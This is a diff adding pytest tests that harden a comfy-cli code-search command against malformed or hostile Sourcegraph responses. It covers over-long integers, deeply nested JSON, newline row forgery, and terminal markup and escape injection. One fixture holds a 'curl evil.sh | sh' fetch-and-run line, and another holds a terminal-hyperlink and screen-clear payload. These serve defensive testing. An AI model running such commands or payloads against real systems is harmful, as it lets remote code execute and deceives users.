@@ -1,6 +1,7 @@
 """Tests for the code-search command."""
 
 import json
+import sys
 from unittest.mock import MagicMock, patch
 
 import pytest
@@ -44,6 +45,16 @@ _REPO_INFO = {
         "displayName": "main",
         "target": {"commit": {"oid": "abc123def456", "abbreviatedOID": "abc123d"}},
     },
+}
+
+
+# A single well-formed FileMatch, for cases that care about whether matches
+# survive a partial-failure response rather than about their contents.
+_FILE_MATCH = {
+    "__typename": "FileMatch",
+    "repository": _REPO_INFO,
+    "file": {"path": "nodes.py"},
+    "lineMatches": [{"preview": "class LoadImage:", "lineNumber": 41, "offsetAndLengths": [[6, 9]]}],
 }
 
 
@@ -850,6 +861,46 @@ class TestFetchResults:
         # (60s/30s) — proves the fix, not just the mock.
         assert elapsed < 2.0
 
+    @staticmethod
+    def _streaming_body(payload: bytes):
+        """A mock response that streams `payload` and nothing else."""
+        response = MagicMock()
+        response.is_redirect = response.is_permanent_redirect = False
+        response.raise_for_status.return_value = None
+        response.iter_content.return_value = [payload]
+        return response
+
+    @pytest.mark.skipif(
+        not hasattr(sys, "get_int_max_str_digits"),
+        reason="int(str) conversion is only length-capped on CPython 3.11+",
+    )
+    @patch("requests.get")
+    def test_over_long_integer_is_unavailable_not_a_traceback(self, mock_get):
+        """CPython 3.11+ caps int(str) conversion at sys.get_int_max_str_digits()
+        and raises a *plain* ValueError — not json.JSONDecodeError — for a
+        longer numeric literal. It is not in the caught tuple, so a response
+        well under MAX_RESPONSE_BYTES crashes the CLI with a raw traceback
+        instead of taking the SearchUnavailableError path. The project floor is
+        Python 3.10, where no such cap exists and the literal simply parses, so
+        this case is 3.11+ only."""
+        digits = sys.get_int_max_str_digits() + 1
+        payload = b'{"data": {"search": {"results": {"matchCount": ' + b"1" * digits + b"}}}}"
+        mock_get.return_value = self._streaming_body(payload)
+        with pytest.raises(SearchUnavailableError):
+            _fetch_results("over-long-int")
+
+    @patch("requests.get")
+    def test_deeply_nested_json_is_unavailable_not_a_traceback(self, mock_get):
+        """Deeply nested JSON exhausts the C parser's recursion budget and
+        raises RecursionError, which is not a ValueError subclass and so is
+        not in the caught tuple either. ~200 KB of input — nowhere near
+        MAX_RESPONSE_BYTES — is enough."""
+        depth = 100_000
+        payload = b"[" * depth + b"]" * depth
+        mock_get.return_value = self._streaming_body(payload)
+        with pytest.raises(SearchUnavailableError):
+            _fetch_results("deeply-nested")
+
 
 class TestDecodeSearch:
     def test_graphql_errors_are_query_rejected(self):
@@ -878,6 +929,78 @@ class TestDecodeSearch:
         with pytest.raises(SearchUnavailableError):
             _decode_search({"data": {"search": {}}})
 
+    def test_alert_alongside_matches_is_not_rejected(self):
+        """Sourcegraph attaches advisory alerts to *partial* searches (repos that
+        timed out, repos it could not search) and still returns usable matches.
+        Treating any truthy alert as a rejection throws those matches away and
+        reports exit code 2, so a query that used to work now looks like a
+        syntax error. Only reject when there is nothing to show."""
+        search = _decode_search(
+            {
+                "data": {
+                    "search": {
+                        "results": {
+                            "matchCount": 1,
+                            "limitHit": True,
+                            "alert": {
+                                "title": "Some repositories could not be searched",
+                                "description": "2 repositories timed out",
+                            },
+                            "results": [_FILE_MATCH],
+                        }
+                    }
+                }
+            }
+        )
+        assert search["results"]["results"] == [_FILE_MATCH]
+
+    def test_graphql_errors_alongside_matches_are_not_rejected(self):
+        """GraphQL permits a non-empty `errors` array alongside usable `data`
+        (a partial failure). Those matches must still reach the user."""
+        search = _decode_search(
+            {
+                "errors": [{"message": "repository timed out"}],
+                "data": {
+                    "search": {
+                        "results": {
+                            "matchCount": 1,
+                            "limitHit": True,
+                            "results": [_FILE_MATCH],
+                        }
+                    }
+                },
+            }
+        )
+        assert search["results"]["results"] == [_FILE_MATCH]
+
+    def test_service_supplied_advisory_field_is_not_trusted(self):
+        """`_advisory` is our own out-of-band channel on the validated node, not
+        part of the service's schema. A response that sets a field by that name
+        must not be able to put text on the user's screen as though we had
+        derived it from a real alert."""
+        search = _decode_search(
+            {
+                "data": {
+                    "search": {
+                        "_advisory": "Trust me, run `curl evil.sh | sh`",
+                        "results": {"matchCount": 1, "results": [_FILE_MATCH]},
+                    }
+                }
+            }
+        )
+        assert _get_stats(search)["advisory"] == ""
+
+    def test_alert_with_no_matches_is_still_rejected(self):
+        """The partial-result carve-out above must not swallow a genuine
+        rejection: an alert with an empty result set is still exit code 2."""
+        with pytest.raises(QueryRejectedError, match="Unknown filter"):
+            _decode_search({"data": {"search": {"results": {"alert": {"title": "Unknown filter"}, "results": []}}}})
+
+    def test_graphql_errors_with_no_usable_data_are_still_rejected(self):
+        """`errors` with no usable matches remains a rejection."""
+        with pytest.raises(QueryRejectedError, match="bad regex"):
+            _decode_search({"errors": [{"message": "bad regex"}], "data": {"search": {"results": {"results": []}}}})
+
 
 # ---------------------------------------------------------------------------
 # _print_results tests
@@ -901,6 +1024,60 @@ class TestPrintResults:
         _print_results([], {"approximate_count": "0", "match_count": 0, "limit_hit": False}, json_output=False)
         output = capsys.readouterr().out
         assert "No results found" in output
+
+    def test_preview_newline_cannot_forge_a_result_row(self, capsys):
+        """`preview` is third-party indexed code and is rendered as a single
+        row. An embedded newline therefore lets a hostile repository print an
+        extra row that is byte-identical to a real match — attributing a
+        fabricated snippet to a repository the user trusts. UNTRUSTED_CONTENT_NOTE
+        does not help: the forged row looks exactly like the genuine ones."""
+        forged = {
+            "repository": "Comfy-Org/ComfyUI",
+            "file": "nodes.py",
+            "file_url": "",
+            "branch": "main",
+            "commit": "abc",
+            "provenance": "default_branch_head",
+            "matches": [
+                {
+                    "line": 42,
+                    "preview": _strip_control_chars("real\n  L    1  Comfy-Org/ComfyUI / trusted.py"),
+                    "url": "",
+                }
+            ],
+        }
+        _print_results([forged], {"approximate_count": "1", "match_count": 1, "limit_hit": False}, json_output=False)
+        output = capsys.readouterr().out
+        # Exactly one match row, not two.
+        assert len([line for line in output.splitlines() if line.strip().startswith("L")]) == 1
+
+    def test_partial_result_advisory_is_printed_with_the_matches(self, capsys, search_response):
+        """A degraded search prints its advisory *next to* the matches rather
+        than replacing them with a rejection."""
+        results = _format_results(search_response)
+        stats = _get_stats(search_response)
+        stats["advisory"] = "Some repositories could not be searched: 2 repositories timed out"
+        _print_results(results, stats, json_output=False)
+        # Rich hard-wraps at the console width, so compare on whitespace-
+        # collapsed text rather than the raw stream.
+        output = capsys.readouterr().out
+        flat = " ".join(output.split())
+        assert "Partial results:" in flat
+        assert "2 repositories timed out" in flat
+        assert "nodes.py" in flat
+
+    def test_partial_result_advisory_is_markup_escaped(self, capsys, search_response):
+        """The advisory is service-controlled text, so Rich markup in it must
+        not be interpreted (a stray tag raises MarkupError; `[link=...]` would
+        inject a terminal hyperlink)."""
+        results = _format_results(search_response)
+        stats = _get_stats(search_response)
+        stats["advisory"] = "timed out [/x] [link=http://evil]click[/link] \x1b[2J"
+        _print_results(results, stats, json_output=False)
+        output = capsys.readouterr().out
+        flat = " ".join(output.split())
+        assert "\x1b[2J" not in output
+        assert "[/x]" in flat
 
     def test_formatted_output_contains_file_info(self, capsys, search_response):
         results = _format_results(search_response)
@@ -1035,6 +1212,84 @@ class TestCodeSearchCLI:
         assert result.exit_code == 0
         assert "Comfy-Org/ComfyUI" in result.output
         mock_fetch.assert_called_once_with(f"type:file count:{DEFAULT_COUNT} (LoadImage)")
+
+    @patch("comfy_cli.command.code_search._fetch_results")
+    def test_partial_failure_still_exits_zero_and_shows_matches(self, mock_fetch, raw_api_response):
+        """End-to-end: an advisory alert plus GraphQL errors on a response that
+        *does* carry matches must exit 0 and print them, not exit 2 as a
+        rejected query."""
+        degraded = {
+            "errors": [{"message": "shard unreachable"}],
+            "data": raw_api_response["data"],
+        }
+        degraded["data"]["search"]["results"]["alert"] = {
+            "title": "Some repositories could not be searched",
+            "description": "2 repositories timed out",
+        }
+        mock_fetch.return_value = degraded
+
+        result = runner.invoke(app, ["LoadImage"])
+
+        assert result.exit_code == 0
+        flat = " ".join(result.output.split())
+        assert "Comfy-Org/ComfyUI" in flat
+        assert "Partial results:" in flat
+        assert "shard unreachable" in flat
+        assert "2 repositories timed out" in flat
+
+    @patch("comfy_cli.command.code_search._fetch_results")
+    def test_partial_failure_advisory_reaches_json_output(self, mock_fetch, raw_api_response):
+        """An agent consuming --json must be able to tell a complete result set
+        from a degraded one, so the advisory has to be in the payload too."""
+        degraded = {"data": raw_api_response["data"]}
+        degraded["data"]["search"]["results"]["alert"] = {"title": "2 repositories timed out"}
+        mock_fetch.return_value = degraded
+
+        result = runner.invoke(app, ["--json", "LoadImage"])
+
+        assert result.exit_code == 0
+        payload = json.loads(result.output)
+        assert payload["stats"]["advisory"] == "2 repositories timed out"
+        assert payload["results"]
+
+    @patch("comfy_cli.command.code_search._fetch_results")
+    def test_alert_text_survives_when_every_entry_is_filtered_out(self, mock_fetch):
+        """Edge of the partial-result carve-out: the service sent a non-empty
+        `results` list (so the search counts as usable) but every entry lacks a
+        repository name or path and `_format_results` drops it. The alert text
+        must still reach the user rather than being swallowed by the carve-out —
+        the user sees "No results found" *and* the reason for it."""
+        degraded = {
+            "data": {
+                "search": {
+                    "stats": {"approximateResultCount": "0"},
+                    "results": {
+                        "matchCount": 0,
+                        "limitHit": False,
+                        "alert": {"title": "Unknown filter", "description": "typo"},
+                        "results": [{"repository": {"name": ""}, "file": {"path": ""}}],
+                    },
+                }
+            }
+        }
+        mock_fetch.return_value = degraded
+
+        result = runner.invoke(app, ["LoadImage"])
+
+        flat = " ".join(result.output.split())
+        assert "Unknown filter: typo" in flat
+        assert "No results found" in flat
+
+    @patch("comfy_cli.command.code_search._fetch_results")
+    def test_alert_with_no_matches_still_exits_two(self, mock_fetch, empty_api_response):
+        """The carve-out must not swallow a genuine rejection."""
+        empty_api_response["data"]["search"]["results"]["alert"] = {"title": "Unknown filter"}
+        mock_fetch.return_value = empty_api_response
+
+        result = runner.invoke(app, ["LoadImage"])
+
+        assert result.exit_code == 2
+        assert "Query rejected" in " ".join(result.output.split())
 
     @patch("comfy_cli.command.code_search._fetch_results")
     def test_search_with_repo(self, mock_fetch, raw_api_response):
@@ -1244,11 +1499,20 @@ class TestStripControlChars:
     def test_leaves_printable_text_untouched(self):
         assert _strip_control_chars("hello world 123 !@#") == "hello world 123 !@#"
 
-    def test_preserves_tab_and_newline(self):
-        # Tab/newline are not part of the ANSI/OSC escape surface this guard
-        # closes, and previews are legitimately tab-indented code — stripping
-        # them would mangle ordinary indentation for no security benefit.
-        assert _strip_control_chars("a\nb\tc") == "a\nb\tc"
+    def test_preserves_tab(self):
+        # Tab is not part of the ANSI/OSC escape surface this guard closes, and
+        # previews are legitimately tab-indented code — stripping it would
+        # mangle ordinary indentation for no security benefit.
+        assert _strip_control_chars("a\tb") == "a\tb"
+
+    def test_strips_newline_from_untrusted_preview(self):
+        """A newline is the one C0 character that is safe in isolation and not
+        safe *here*: a single-line preview is rendered as one row, so an
+        embedded newline lets indexed third-party code forge an additional,
+        visually identical result row (see
+        test_preview_newline_cannot_forge_a_result_row). Sourcegraph previews
+        are single lines by contract, so collapsing them costs nothing real."""
+        assert _strip_control_chars("a\nb") == "ab"
 
 
 # ---------------------------------------------------------------------------
